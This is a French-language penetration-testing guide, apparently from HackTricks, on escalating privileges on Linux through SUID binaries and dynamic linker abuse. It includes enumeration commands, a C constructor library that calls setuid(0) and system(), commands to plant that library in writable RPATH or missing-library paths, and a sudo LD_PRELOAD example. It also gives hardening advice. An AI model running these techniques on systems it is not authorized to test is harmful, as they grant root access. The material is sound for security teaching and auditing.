# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

Les binaires SUID sont généralement examinés pour rechercher une exécution directe de commandes, mais les programmes SUID personnalisés peuvent également être vulnérables via le dynamic linker. Le thème commun est simple : un exécutable privilégié charge du code depuis un chemin ou une configuration qu'un utilisateur moins privilégié peut contrôler.<sup>[[1]](#references)</sup>

Cette page se concentre sur des schémas de techniques génériques : bibliothèques manquantes, répertoires de bibliothèques accessibles en écriture, `RPATH`/`RUNPATH`, `LD_PRELOAD` via sudo, configuration du linker et confusion liée aux hardlinks SUID.

## Énumération rapide

Commencez par rechercher les fichiers SUID inhabituels et vérifiez s'ils sont liés dynamiquement :<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concentrez-vous sur les emplacements non standard, les chemins d’application personnalisés, les binaires appartenant à root mais situés en dehors des répertoires gérés par les paquets, ainsi que les dépendances chargées depuis des répertoires accessibles en écriture.<sup>[[1]](#references)</sup>

Vérifications utiles des permissions d’écriture :
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Certains binaires SUID personnalisés tentent de charger un shared object qui n'existe pas. Si le chemin manquant se trouve sous un répertoire contrôlé par l'attaquant, le binaire peut charger du code fourni par l'attaquant avec l'utilisateur effectif.<sup>[[1]](#references)</sup>

Trouvez les recherches de bibliothèques ayant échoué avec le filtre d'appels système de `strace` :<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Si le binaire recherche `libexample.so` dans un chemin accessible en écriture, une proof library minimale peut utiliser un constructor. Gardez la proof-of-impact inoffensive pendant la validation :<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compilez-le avec le nom de fichier exact que le binaire tente de charger :
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condition exploitable n’est pas uniquement l’absence de la bibliothèque. L’attaquant doit pouvoir placer un objet partagé compatible à un chemin que le loader privilégié acceptera.<sup>[[1]](#references)</sup>

## Répertoire de bibliothèques accessible en écriture

Parfois, toutes les dépendances existent, mais l’un des répertoires utilisés pour les résoudre est accessible en écriture. Cela peut permettre de remplacer une bibliothèque chargée ou de placer une bibliothèque prioritaire portant le même nom.<sup>[[1]](#references)</sup>

Examiner les chemins des dépendances :<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Si le répertoire est accessible en écriture, validez cela avec une approche sûre basée sur une copie dans un lab. Remplacer des bibliothèques système sur un hôte en production peut laisser des processus qui démarrent simultanément avec des versions de bibliothèques incohérentes.<sup>[[8]](#references)</sup>

## RPATH et RUNPATH

`RPATH` et `RUNPATH` sont des entrées de la section dynamique qui indiquent au loader où rechercher les bibliothèques. Elles sont dangereuses dans les programmes SUID lorsqu’elles pointent vers des répertoires accessibles en écriture par l’attaquant.<sup>[[1]](#references)</sup>

Les détecter :<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Exemple de sortie à risque :
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Si `/opt/app/lib` est accessible en écriture et que le binaire a besoin de `libcustom.so`, l'attaquant peut être en mesure d'y placer un `libcustom.so` malveillant :<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` et `RUNPATH` ne sont pas identiques dans tous les détails de résolution, mais pour l’analyse d’une élévation de privilèges, la question pratique reste la même : le binaire SUID recherche-t-il le nom d’une library dans un répertoire accessible en écriture à l’attaquant ?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH and SUID

Pour les programmes normaux, `LD_PRELOAD` et `LD_LIBRARY_PATH` peuvent forcer ou influencer le chargement des shared objects. Pour les programmes SUID, le dynamic loader passe normalement en mode d’exécution sécurisé et ignore les variables d’environnement dangereuses.<sup>[[1]](#references)</sup>

Cela signifie qu’un binaire SUID classique n’est généralement pas vulnérable simplement parce que l’utilisateur peut définir `LD_PRELOAD` :<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
L’exception courante est une règle sudo qui autorise la définition ou la conservation de variables du loader pour la commande cible. Examinez `sudo -l` à la recherche d’entrées telles que `env_keep+=LD_PRELOAD` ou `env_keep+=LD_LIBRARY_PATH` ; si la cible est liée dynamiquement, elle peut charger du code contrôlé par l’attaquant :<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Ne confondez pas ces cas ; les règles du loader et de la policy sudo ci-dessus les distinguent :<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` contre un binaire SUID normal : généralement bloqué par l’exécution sécurisée.
- `LD_PRELOAD` conservé par sudo : potentiellement exploitable.
- `.so` manquant dans un chemin accessible en écriture : exploitable lorsque le binaire SUID charge naturellement ce chemin.
- `RPATH`/`RUNPATH` vers un répertoire accessible en écriture : exploitable lorsqu’une bibliothèque nécessaire peut être contrôlée.
- Accès en écriture à `/etc/ld.so.preload` ou à la configuration du linker : impact global au système et élevé.

## Configuration du linker

`ld.so` utilise le cache du linker et `/etc/ld.so.preload` ; `ldconfig` construit ce cache à partir de `/etc/ld.so.conf` et des fichiers inclus depuis celui-ci, généralement dans `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Vérifications à forte valeur :
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Une configuration du linker accessible en écriture est généralement plus grave qu’un seul binaire SUID vulnérable, car elle peut affecter de nombreux processus liés dynamiquement. `/etc/ld.so.preload` est particulièrement dangereux, car il peut forcer le chargement d’un objet partagé dans des processus privilégiés.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## Confusion liée aux hardlinks SUID

Les hardlinks peuvent faire apparaître le même inode SUID sous plusieurs noms.<sup>[[9]](#references)</sup> Cela peut servir à dissimuler un helper privilégié, à perturber le nettoyage ou à contourner une vérification naïve basée sur les chemins.

Recherchez les fichiers SUID ayant plusieurs liens :<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspectez tous les chemins vers le même inode :<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
L’abus ne réside pas dans le fait qu’un hardlink modifie les permissions. Il réside dans la confusion de chemin : un inode privilégié peut être accessible via un nom que les défenseurs ou les scripts ne s’attendent pas à trouver.<sup>[[9]](#references)</sup> Pour approfondir le fonctionnement des inodes et des hardlinks, consultez [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Notes défensives

- Gardez les binaires SUID minimaux, audités et gérés par les packages lorsque cela est possible.
- Évitez les entrées `RPATH`/`RUNPATH` pointant vers des répertoires accessibles en écriture ou gérés par des applications.<sup>[[1]](#references)[[8]](#references)</sup>
- Gardez les répertoires de bibliothèques appartenant à root et non accessibles en écriture par les utilisateurs ordinaires.<sup>[[8]](#references)</sup>
- Ne préservez pas `LD_PRELOAD`, `LD_LIBRARY_PATH` ou des variables similaires du loader via sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Surveillez `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` et les fichiers SUID inattendus.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Examinez les fichiers SUID liés par hardlink et enquêtez sur les wrappers SUID personnalisés situés en dehors des chemins système standard.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — page de manuel Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (Utilitaires binaires GNU)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — page de manuel Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Attributs courants (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Renforcement du Dynamic Linker (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (Utilitaires binaires GNU)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
